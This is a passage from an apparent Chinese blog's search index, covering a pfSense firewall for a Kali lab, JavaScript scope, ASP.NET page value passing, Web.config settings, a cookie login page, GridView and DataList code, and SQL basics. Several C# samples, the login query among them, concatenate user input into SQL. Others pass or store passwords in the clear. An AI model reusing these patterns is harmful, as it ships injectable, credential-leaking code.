subnet”即是只有处于192.168.14.x下的ip网段才能上网了,然后选择OPT1为DWNZ区添加ip地址网段”192.168.56.10/24” 但是由于设置的是私有类ip，还需要进入WAN设置项里将默认的”block private networks”一项的钩钩去掉。自此linux虚拟环境下的网络防火墙经部署完成！ 0x04 大型公司的防火墙背靠背防火墙,即是双层防护墙:Pfsense，即是第一层使用momo防火墙，再建立一层pfsense防火请。 https://pfsense.org/ 如此kali的渗透环境就算搭建完成了哦!]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS变量作用域和内存(1)]]></title>
      <url>%2F2016%2F01%2F17%2FJS%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E5%86%85%E5%AD%98(1)%2F</url>
      <content type="text"><![CDATA[0x01 基本类型和引用类型ECMAScript 中规定变量有两种类型:基本类型和引用类型。 在将一个值赋值给变量的时候，解析器必需确定这个值是基本类型值还是引用类型值。ES6 规定了 6 种基本数据类型: Undefined, Null, String, Number,Boolean, Symbol。这 6 中基本数据类型是按值访问的，可以直接操作变量中的实际值。 而引用类型是保存在内存中的对象，当对引用类型进行复制的时候，实际上是在操作对象的引用。 比如，从一个变量向另一个变量复制基本类型的值，会在变量对象上创建一新值，然后将该值复制到为新变量分配的位置上。 而从一个变量向另一个变量复制引用类型的值时，则是将对象的引用复制给变量。 检测类型可以使用 typeof 操作符来检测一个变量是不是基本数据类型。但如果变量中保存的值是对象或者 null， 则应该使用 instanceof 操作符。 123var s = &apos;jack&apos;;console.log(typeof s)// string 123var person = [1, 3, 4];console.log( person instanceof Array);// true 在检测一个引用类型值和 Object 构造函数时， instanceof 操作符会返回 true,而检测基本类型的值时，会返回 false。 其实，typeof 也好，instanceof 也罢，某些情况下，两者的检测结果都是不可靠的。 一个完美的解决方案是使用 Object.prototype.toString() 方法去检测一个变量的数据类型。 当然这不在本次讨论范围，请参考: http:// 0x01 执行环境及其作用域Javascript 中的执行环境(excution context)定义了变量或函数有权访问哪些数据，并决定了它们各自的行为。每个执行环境有一个相关联的 变量对象(variable object)，环境中定义的所有变量和函数都保存在该对象中。 每个函数都有自己的执行环境，而当代码在环境中执行时会创建变量对象的一个 作用域链(scope chain)，作用域链保证了对执行环境有权访问的所有变量和函数的有序访问。 而作用域的链的前端，始终都是当前执行的代码所在环境的变量对象。如果该环境是函数，则将其 活动对象（activation object) 作为变量对象。作用域中的下一个变量对象来自包含环境（外部）环境，而再下一个变量对象则来自下一个包含环境，如此，一直延续到全局执行环境。 如此，内部环境可以通过作用域链访问所有的外部环境，但外部环境不能访问内部环境中的任何变量和函数。 虽说执行环境只有两种：全局和局部。但是以下两种情况会延长作用域链，它们可以在作用域链的前端临时增加一个变量对象，该变量对象会在代码执行后被移除。 try-catch 语句中 catch 块； with 语句。 对于 catch 语句来说，会创建一个新的变量对象，其中包含的是被抛出的错误对象的声明。而对 with 语句来说，会将指定的对象添加到作用域链中。 下面是 with 语句的一个例子: 123456789function buildUrl()&#123; var qs = &quot;?debug=true&quot;; with(location)&#123; var url = href + qs; &#125; return url;&#125; 如上，我们使用 with 语句将 location 对象添加到了 buidUrl 函数执行环境中变量对象的作用域链的前端。当在 with 语句中引用变量 href 时(实际引用的是 locaiton.href)，就可以在当前执行环境的变量对象中找到。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[NET 页面间传值的几种方法]]></title>
      <url>%2F2015%2F07%2F08%2FNET-%E9%A1%B5%E9%9D%A2%E9%97%B4%E4%BC%A0%E5%80%BC%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[0x00 QueryString传值 这是最简单的传值方式，但缺点是传的值会显示在浏览器的地址栏中且不能传递对象，只适用于传递简单的且安全性要求不高的整数值。 新建一个WEB项目，添加一个页面命名为Test1，在页面中添加一个Button命名为btnLogin，再添加两个TextBox分别命名为tbxUserName和tbxPassWord，添加Buttond的Click()事件： 123456private void btnLogin_Click (object sender, System.EventArgs e) &#123; string url=&quot; Test2.aspx?UserName=&quot; +tbxUserName.Text + &quot;&amp;Password=”+tbxPassWord.Text+””; Response.Redirect(url);&#125; 添加另一个页面命名为Test2，在页面添加两个Lable分别命名为labUserName和labPassWord，添加页面的Load()事件： 123456789private void Page_Load (object sender, System.EventArgs e)&#123; labUserName.Text=Request.QueryString[&quot;UserName&quot;]; labPassWord.Text=Request.QueryString[&quot;Password&quot;];&#125; 把Test1设为起始页，运行项目在Test1页面的文本框中输入值后点击按钮，就可以在Test2页面中显Test1页面输入的结果。 0x01 Server.Transfer传值这种方式避免了要传递的值显示在浏览器的地址栏中，但是比较麻烦。 同样新建一个WEB项目，添加两个页面分别命名为Test1和Test2，在Test1页面中添加一个Button命名为btnLogin，再添加两个TextBox分别命名为tbxUserName和tbxPassWord，在Test2页面添加两个Lable分别命名为labUserName和labPassWord，为Test1添加过程返回tbxUserName和tbxPassWord的值并添加btnLogin的Click()事件： 12345678910111213141516171819202122public string UserName&#123; get &#123; return tbxUserName.Text; &#125;&#125;public string Password&#123; get &#123; return tbxPassWord.Text; &#125;&#125;private void btnLogin_Click (object sender, System.EventArgs e)&#123; Server.Transfer(&quot;Test2.aspx&quot;);&#125; 添加Test2页面的Load()事件： 1234567private void Page_Load (object sender, System.EventArgs e)&#123; Test1 t1; //创建原始窗体的实例 t1=( Test1)Context.Handler; //获得实例化的句柄 labUserName.Text= t1.UserName; labPassWord.Text= t1.Password;&#125; 把Test1设为起始页，运行项目在Test1页面的文本框中输入值后点击按钮，就可以在Test2页面中显Test1页面输入的结果。 0x02 Cookie对象变量Cookie是针对每一个用户而言的，是存放在客户端的 ，Cookie的使用要配合ASP.NET内置对象Request来使用。 新建一个WEB项目，添加两个页面分别命名为Test1和Test2，在Test1页面中添加一个Button命名为btnLogin，再添加两个TextBox分别命名为tbxUserName和tbxPassWord，在Test2页面添加两个Lable分别命名为labUserName和labPassWord，为Test1添加Buttond的Click()事件： 12345678910private void btnLogin_Click (object sender, System.EventArgs e)&#123; HttpCookie cookie_UserName = new HttpCookie(&quot;UserName&quot;); HttpCookie cookie_PassWord = new HttpCookie(&quot;PassWord &quot;); cookie_ UserName.Value = tbxUserName.Text; cookie_ PassWord.Value = tbxPassWord.Text; Response.AppendCookie(cookie_ UserName); Response.AppendCookie(cookie_ PassWord); Server.Transfer(&quot;Test2.aspx&quot;);&#125; 添加Test2页面的Load()事件： 12345private void Page_Load (object sender, System.EventArgs e)&#123; labUserName.Text = Request.Cookies[&quot;UserName&quot;].Value.ToString(); labPassWord.Text = Request.Cookies[&quot;PassWord &quot;].Value.ToString();&#125; 把Test1设为起始页，运行项目在Test1页面的文本框中输入值后点击按钮，就可以在Test2页面中显Test1页面输入的结果。 0x03 Session对象变量 Session也是针对每一个用户而言的，但它是存放在服务器端的 ，Session不仅可以把值传递到下一个页面，还可以交叉传递到多个页面，直至把Session变量的值removed 后，变量才会消失。 新建一个WEB项目，添加两个页面分别命名为Test1和Test2，在Test1页面中添加一个Button命名为btnLogin，再添加两个TextBox分别命名为tbxUserName和tbxPassWord，在Test2页面添加两个Lable分别命名为labUserName和labPassWord，为Test1添加Buttond的Click()事件： 123456private void btnLogin_Click (object sender, System.EventArgs e)&#123; Session[&quot;UserName&quot;]=tbxUserName.Text; Session[&quot;PassWord&quot;]=tbxPassWord.Text; Response.Redirect(&quot;Test2.aspx&quot;);&#125; 添加Test2页面的Load()事件： 1234567private void Page_Load (object sender, System.EventArgs e)&#123; labUserName.Text=Session[&quot;UserName&quot;].ToString(); labPassWord.Text=Session[&quot;Password&quot;].ToString(); Session.Remove(&quot;UserName&quot;); //清除Session Session.Remove(&quot;PassWord&quot;); //清除Session&#125; 把Test1设为起始页，运行项目在Test1页面的文本框中输入值后点击按钮，就可以在Test2页面中显Test1页面输入的结果。 0x04 Application对象变量：Application对象的作用范围是整个全局，也就是说对所有用户都有效。其常用的方法用Lock和UnLock，例如： 新建一个WEB项目，添加两个页面分别命名为Test1和Test2，在Test1页面中添加一个Button命名为btnLogin，再添加两个TextBox分别命名为tbxUserName和tbxPassWord，在Test2页面添加两个Lable分别命名为labUserName和labPassWord，为Test1添加Buttond的Click()事件： 123456private void btnLogin_Click (object sender, System.EventArgs e)&#123; Application[&quot;UserName&quot;] = tbxUserName.Text; Application[&quot;PassWord &quot;] = tbxPassWord.Text; Server.Transfer(&quot;Test2.aspx&quot;);&#125; 添加Test2页面的Load()事件： 1234567private void Page_Load (object sender, System.EventArgs e)&#123; Application.Lock(); labUserName. Text = Application[&quot;UserName&quot;].ToString(); labPassWord. Text = Application[&quot;PassWord &quot;].ToString(); Application.UnLock();&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Web.config数据库设置]]></title>
      <url>%2F2015%2F05%2F30%2F%E8%BF%9E%E6%8E%A5MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
      <content type="text"><![CDATA[0x00 Web.config数据库设置12345678910111213141516171819202122232425262728&lt; configuration &gt;&lt; appSettings &gt; &lt;!-- 数据库设置Start --&gt; &lt;!-- Access or MsSql --&gt; &lt; add key =&quot; DBType &quot; value =&quot;MsSql &quot; /&gt; &lt; add key =&quot; MsSql &quot; value =&quot;Data Source=.;uid=sa;pwd=123;Initial Catalog=Library; &quot; /&gt; &lt;!-- &lt;add key=&quot;MsSql&quot; value=&quot;Data Source=PC-20131115XURX\SQLEXPRESS;Integrated Security=SSPI;Initial Catalog=FrameWorknew;&quot;/&gt; --&gt; &lt;!-- &lt;add key=&quot;MsSql&quot; value=&quot;server=127.0.0.1;database=FrameWork;uid=sa;pwd=sa;&quot;/&gt; --&gt; &lt;!-- &lt;add key=&quot;Access&quot; value=&quot;\DataBase\Access\FrameWork.config&quot;/&gt; &lt;!--add key=&quot;Oracle&quot; value=&quot;Data Source=myhome;Persist Security Info=True;User ID=sa;Password=sa;Unicode=True&quot;/&gt;--&gt; &lt;!-- 数据库设置End --&gt; &lt;!-- 当前显示应用模组 0:显示所有应用 其它显示相关应用 --&gt; &lt; add key =&quot; ApplicationID&quot; value =&quot;0 &quot; /&gt; &lt;!-- 用户在线过期时间 (分)默认30分 如果用户在当前设定的时间内没有任何操作,将会被系统自动退出 设为0则此功能无效(仅限于开发模式使用) --&gt; &lt; add key =&quot; OnlineMinute&quot; value =&quot;600 &quot; /&gt; &lt;!-- 显示出错详细信息在用户页面(开发环境设置为True,在生产环境请设置为false) --&gt; &lt; add key =&quot; DispError&quot; value =&quot; false &quot; /&gt; &lt;/ appSettings &gt; &lt; connectionStrings &gt; &lt; add name =&quot; BSPOWERConnectionString &quot; connectionString =&quot; Data Source=.;Intergrated Security=SSPI;Initial Catalog=MySQL;&quot; providerName =&quot;System.Data.sqlClient &quot;/&gt; &lt; add name =&quot; BSPOWERConnectionStrings &quot; connectionString =&quot; provider=sqlOleDb;Data Source=.;database=MySQL;uid=sa;pwd=123;&quot; providerName =&quot;System.Data.OleDb &quot;/&gt; &lt;/ connectionStrings &gt;&lt; system.web &gt;&lt; compilation debug =&quot; false&quot; targetFramework =&quot; 4.5&quot; /&gt;&lt; httpRuntime targetFramework =&quot; 4.5&quot; /&gt;&lt;/ system.web &gt;&lt;/ configuration &gt; 设置完成调用连接字符串的方法： 12string str_sql =ConfigurationManager . ConnectionStrings[ &quot;BSPOWERConnectionStrings&quot; ]. ConnectionString; 0x01 数据库连接类123456789101112131415161718192021222324252627282930using System;using System.Collections.Generic;using System.Linq;using System.Data;using System.Data.OleDb; public class DB &#123; //切记粘贴复制，否则vs会抱错！！ string str_sql = ConfigurationManager.ConnectionStrings[&quot;BSPOWERConnectionStrings&quot;].ConnectionString; public void cmddatabase(string str_cmd) &#123; OleDbConnection conn = new OleDbConnection(str_sql); conn.Open(); OleDbCommand cmd = new OleDbCommand(str_cmd, conn); cmd.ExecuteNonQuery(); conn.Close(); &#125; public DataSet viewdatabase(string str_cmd) &#123; OleDbConnection conn = new OleDbConnection(str_sql); conn.Open(); OleDbCommand cmd = new OleDbCommand(str_cmd, conn); DataSet ds = new DataSet(); OleDbDataAdapter adp = new OleDbDataAdapter(cmd); adp.Fill(ds); conn.Close(); return ds; &#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Cookies简单的登录界面]]></title>
      <url>%2F2015%2F05%2F30%2FCookies%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%2F</url>
      <content type="text"><![CDATA[0x00 登陆页面12345678910111213141516171819202122232425262728293031323334353637using System;using System.Collections.Generic;using System.Linq;using System.Web;using System.Web.UI;using System.Web.UI.WebControls;using System.Data;using System.Data.OleDb;public partial class denglu : System.Web.UI.Page&#123; protected void Page_Load(object sender, EventArgs e) &#123; &#125; protected void Button1_Click(object sender, EventArgs e) &#123; string user = txt_name.Text.Trim(); string pass = txt_pass.Text.Trim(); OleDbConnection cs =new OleDbConnection(&quot;Provider=SQLOLEDB.1;Integrated Security=SSPI;Persist Security Info=False;Initial Catalog=student;Data Source=QTOS-20130815OU\\SQLEXPRESS&quot;); cs.Open(); string cx = &quot;select * from student1 where name=&apos;&quot; + user + &quot;&apos;and passwd=&apos;&quot; + pass + &quot;&apos;&quot;; OleDbCommand cx1 = new OleDbCommand(cx, cs); OleDbDataAdapter adp = new OleDbDataAdapter(cx1); DataSet da = new DataSet(); adp.Fill(da); if (da.Tables[0].Rows.Count &gt; 0) &#123; Response.Cookies[&quot;user&quot;].Value = user; Response.Cookies[&quot;user&quot;].Expires = System.DateTime.Now.AddHours(9); Response.Redirect(&quot;denglu1.aspx&quot;); &#125; else &#123; Response.Write(&quot;该用户不存在&quot;); &#125; &#125;&#125; 0x01 接受页面123456789101112131415161718using System;using System.Collections.Generic;using System.Linq;using System.Web;using System.Web.UI;using System.Web.UI.WebControls;public partial class denglu1 : System.Web.UI.Page&#123; protected void Page_Load(object sender, EventArgs e) &#123; if (Request.Cookies[&quot;user&quot;] == null) &#123; Response.Redirect(&quot;denglu.aspx&quot;); &#125; &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用DataList控件]]></title>
      <url>%2F2015%2F05%2F30%2F%E4%BD%BF%E7%94%A8DataList%E6%8E%A7%E4%BB%B6%2F</url>
      <content type="text"><![CDATA[0x00 DataList控件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172using System;using System.Collections.Generic;using System.Linq;using System.Web;using System.Web.UI;using System.Web.UI.WebControls;using System.Data;public partial class datalist : System.Web.UI.Page&#123; protected void Page_Load(object sender, EventArgs e) &#123; if (!IsPostBack) &#123; bind(); &#125; &#125; protected void bind() &#123; string str_view = &quot;select * from book &quot;; database db = new database(); DataSet ds = db.viewdatabase(str_view); DataList1.DataSource = ds.Tables[0].DefaultView; DataList1.DataBind(); &#125; protected void DataList1_CancelCommand(object source, DataListCommandEventArgs e) &#123; DataList1.EditItemIndex = -1; bind(); &#125; protected void DataList1_DeleteCommand(object source, DataListCommandEventArgs e) &#123; string str_id = DataList1.DataKeys[e.Item.ItemIndex].ToString(); string str_del = &quot;delete from book where id=&quot; + str_id; database db = new database(); db.cmddatabase(str_del); bind(); &#125; protected void DataList1_EditCommand(object source, DataListCommandEventArgs e) &#123; DataList1.EditItemIndex = e.Item.ItemIndex; bind(); &#125; protected void DataList1_ItemCommand(object source, DataListCommandEventArgs e) &#123; if (e.CommandName == &quot;more&quot;) &#123; DataList1.SelectedIndex = e.Item.ItemIndex; bind(); &#125; if (e.CommandName == &quot;back&quot;) &#123; DataList1.SelectedIndex = -1; bind(); &#125; &#125; protected void DataList1_UpdateCommand(object source, DataListCommandEventArgs e) &#123; string str_up = &quot;&quot;; string str_id = DataList1.DataKeys[e.Item.ItemIndex].ToString(); string bookname = ((TextBox)e.Item.FindControl(&quot;txt_book&quot;)).Text.Trim(); string price = ((TextBox)e.Item.FindControl(&quot;txt_price&quot;)).Text.Trim(); string author = ((TextBox)e.Item.FindControl(&quot;txt_author&quot;)).Text.Trim(); string copyright = ((TextBox)e.Item.FindControl(&quot;txt_copy&quot;)).Text.Trim(); str_up = &quot;update book set bookname=&apos;&quot;+bookname+&quot;&apos;,price=&apos;&quot;+price+&quot;&apos;,author=&apos;&quot;+author+&quot;&apos;,copyright=&apos;&quot;+copyright+&quot;&apos; where id=&quot; + str_id; database db = new database(); db.cmddatabase(str_up); DataList1.EditItemIndex = -1; bind(); &#125;&#125; 0x01 datalist 数据显示自动换行在前台添加代码 1234567&lt;style type=&quot;text/css&quot;&gt; #form1 &#123; word-break:break-all ;word-wrap: break-word; display:block ; &#125; &lt;/style&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用GrideView控件]]></title>
      <url>%2F2015%2F05%2F17%2F%E4%BD%BF%E7%94%A8GrideView%E6%8E%A7%E4%BB%B6%2F</url>
      <content type="text"><![CDATA[0x00 数据绑定123456789DataSet ds = new DataSet();DB sq = new DB();string sql = &quot;select *from table_2&quot;;ds = sq.getdata(sql);//对grideview进行默认的降序排序ds.Tables[0].DefaultView.Sort = strcmd;//对grideview进行数据绑定GridView1.DataSource = ds.Tables[0].DefaultView;GridView1.DataBind(); 0x01 编辑12345protected void GridView1_RowEditing(object sender, GridViewEditEventArgs e) &#123; GridView1.EditIndex = e.NewEditIndex; bangdata(); &#125; 0x02 取消12345protected void GridView1_RowCancelingEdit(object sender, GridViewCancelEditEventArgs e) &#123; GridView1.EditIndex = -1; &#125; 0x03 删除123456789protected void GridView1_RowDeleting(object sender, GridViewDeleteEventArgs e) &#123; //绑定关键字 string str_id = GridView1.DataKeys[e.RowIndex].Value.ToString(); string str_cmd = &quot;delete from Table_2 where id=&quot; + str_id; DB coon = new DB(); coon.excutesql(str_cmd); &#125; 0x04 更新在使用GridView控件进行数据更新时可以为数据源设置DataKeyNames关键字段，在GridView属性，数据的DataKeyNames中添加以逗隔开的字段关键子。 12345678910111213141516171819202122protected void GridView1_RowUpdating(object sender, GridViewUpdateEventArgs e) &#123; //绑定关键字 string str_id = GridView1.DataKeys[e.RowIndex].Value.ToString(); //通过强制转换获取控件里的值，方法1： string str_name = ((TextBox)GridView1.Rows[e.RowIndex].Cells[1].Controls[0]).Text.Trim(); string pass_word = ((TextBox)GridView1.Rows[e.RowIndex].Cells[2].Controls[0]).Text.Trim(); string str_jiguan = ((TextBox)GridView1.Rows[e.RowIndex].Cells[3].Controls[0]).Text.Trim(); string str_age = ((TextBox)GridView1.Rows[e.RowIndex].Cells[4].Controls[0]).Text.Trim(); string str_sex = ((TextBox)GridView1.Rows[e.RowIndex].Cells[5].Controls[0]).Text.Trim();/*方法2：通过强制转换获取控件里的值string str_sex = ((DropDownList)GridView1.Rows[e.RowIndex].FindControl(&quot;DropDownList1&quot;)).SelectedValue.ToString();)*/ string str_email = ((TextBox)GridView1.Rows[e.RowIndex].Cells[6].Controls[0]).Text.Trim(); string str_cmd = &quot;update Table_2 set name=&apos;&quot; + str_name + &quot;&apos;,password=&apos;&quot;+pass_word+&quot;&apos;,jiguan=&apos;&quot; + str_jiguan + &quot;&apos;,age=&apos;&quot;+str_age+&quot;&apos;,sex=&apos;&quot;+str_sex+&quot;&apos;,email=&apos;&quot;+str_email+&quot;&apos; where id=&quot;+str_id; DB coon = new DB(); coon.excutesql(str_cmd); GridView1.EditIndex = -1; bangdata(); &#125; 0x04 分页123456protected void GridView1_PageIndexChanging(object sender, GridViewPageEventArgs e) &#123; GridView1.PageIndex = e.NewPageIndex; bangdata(); &#125; 0x05 排序12345protected void GridView1_Sorting(object sender, GridViewSortEventArgs e) &#123; strcmd = e.SortExpression; bangdata(); &#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SQL简单语句]]></title>
      <url>%2F2015%2F05%2F17%2FSQL%E7%AE%80%E5%8D%95%E8%AF%AD%E5%8F%A5%2F</url>
      <content type="text"><![CDATA[0x00 select的使用语法： { Select [Top(数值)] 字段列表 *From 表 [Where 条件 ][Order By 字段] [Group 字段] } 其中: order by:按字段排序 group by 按字段求和 选取全部数据1Select *From table 选取指定字段的数据1Select name，sex，age From table 只选取前3条数据12Select Top *From table //Select Top（3）From table Where name 用原表中的字段产生派生字段1Select name，（submit_date+365）=new_date From table 根据条件选取1Select *From table where name=&apos;曹操&apos; 关键字查询12Select *From table Where name like&apos;%嘲%&apos; //Select *From name like&apos;李%&apos; 查询结果排序1Select *From table Order By name ASC(升序)||DESC(降序) 0x01 insert的使用麻痹的insert 不能单独与where结合使用这是无意义的！！fuck fuck fuck！！ 语法： { Insert Into 表（字段1，字段2，。。。。）Values（字段1的值，字段2的值,…）} 增加一条完整信息1Insert Into table （name，sex，age，number，submit_data）Values（&apos;蒙蒙&apos;，&apos;男&apos;，&apos;6&apos;，&apos;174855893&apos;，#11/1/2013#） 0x02 update的使用语法： { Update 表 Set 字段1=字段1值，字段2=字段2值，……[Where 条件] } 修改用户电话和email1Update table Set tel=&apos;33342&apos;,email=&apos;234@qq.com&apos; Where name=&apos;jijiang&apos; 将所有人的年龄增加101Update table Set age=age+104 0x03 Delete的使用语法： { Delete From 表 [Where 条件] } 删除一个表1Delete From table 按条件删除1Delete From table Where name=‘曹超&apos;; 0x04 like模糊查询“-”“[]”(特别注意只有 char varchar text 类型的数据才能使用like运算符和通配符） like相当于=1234select from table where name like &apos;计算机&apos; ``` ##### like相当于&lt;&gt; select from table where name not like ‘计算机’123---### 0x05 通配符% select name,scout,ctestfrom coursewhere chame like ‘计算机%’ //查询以course表中差么字段以计算机开头的所有开头匹配查询like ‘%计算机’ //结尾匹配查询like ‘%中间匹配%’ //中间匹配查询like ‘计算机%基础’ //使用通配符%查询以“计算机”开头“基础”结束的所有信息123456---### 0x06 通配符-与like类似 只是在确定字段个数但不确定某个或几个字时使用:##### 查询包含以计算机开头的六个字的所有课程 select cname，scount,ctestfrom cousewhere cname like ‘计算机—‘and not cname like ‘计算机–’123456---### 0x07 通配符[ ]用于查询指定一系列的字符，只有满足这些字符其中之一且出现在[ ]的位置时，满足查询条件##### 查询以不以”计“或”生“字开头的所有课程名称 select cname,scount,ctestfrom coursewhere cname like ‘[^计生]%’order by cname desc123---### 0x08 转义字符 escape like ‘%m%’ escape ‘m’``` 用escape定义了转义字符 m 所以第二个%被作为”百分号“而不再作为sql的关键字。]]></content>
    </entry>

    
  
  
</search>
